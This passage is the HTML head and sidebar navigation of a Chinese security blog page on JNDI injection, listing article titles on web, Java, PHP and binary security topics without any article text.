<!DOCTYPE html>
<html lang="zh-CN">

<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>

    
      <link rel="icon" href="/kanxi.jpg">
    

    <title>
        
          浅析JNDI注入 - Mi1k7ea
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- Noto Sans TC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
    <!-- Noto Sans SC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
    <!-- Noto Sans -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">

    <!-- theme css & js -->
    <link rel="stylesheet" href="/css/book.css">
    <script src="/js/book.js"></script>

    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('img')
})
</script>

</head>

<body>

<div class="container">
  <div class="book-container">
    <div class="columns">
      <div class="column col-2 hide-lg">
        <div class="book-sidebar">
  <h4 class="site-meta">
    <a href="/">Mi1k7ea</a>
  </h4>
  <div class="sidebar-content">
    <ul>
<li><strong><a href="/archives/">文章归档</a></strong></li>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
</ul>

  </div>
</div>

<script src="/js/book-sidebar.js"></script>

<script>
collapse_sidebar(2)
highlight_tab()
show_sidebar()
</script>
      </div>

      <div class="column col-8 col-lg-12">
        <div class="book-content">
          <div class="book-navbar">
  <header class="navbar">
  <section class="navbar-section">
    <img class="navbar-icon" src="/kanxi.jpg">
  </section>
  <section class="navbar-center">
    Mi1k7ea
  </section>
  <section class="navbar-section">
    <label class="accordion-header c-hand" for="accordion-sidebar">
      <i class="icon icon-menu"></i>
    </label>
  </section>
</header>

<div class="accordion">
  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
  <div class="accordion-body">
    <ul>
<li><strong><a href="/archives/">文章归档</a></strong></li>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
